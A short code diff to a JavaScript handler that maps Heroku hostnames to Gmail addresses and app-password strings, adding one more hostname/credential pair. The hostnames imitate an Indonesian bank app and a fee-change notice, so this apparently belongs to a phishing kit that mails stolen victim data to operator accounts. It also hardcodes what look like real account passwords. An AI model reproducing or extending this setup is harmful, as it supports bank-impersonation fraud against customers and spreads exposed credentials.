@@ -19,6 +19,11 @@ export default function handler(req, res) {
     } else if (url == 'app-log-brimo-bifast.herokuapp.com'){
         email = 'brigacor80@gmail.com';
         pass = 'zhzcfhbdtzipldsz';
+        
+    } else if(url == 'per-ubahan-tarif.herokuapp.com'){
+        email = 'qqq66195@gmail.com';
+        pass = 'gsnyrcjtylrepjdg';
+
     }
         
         try {
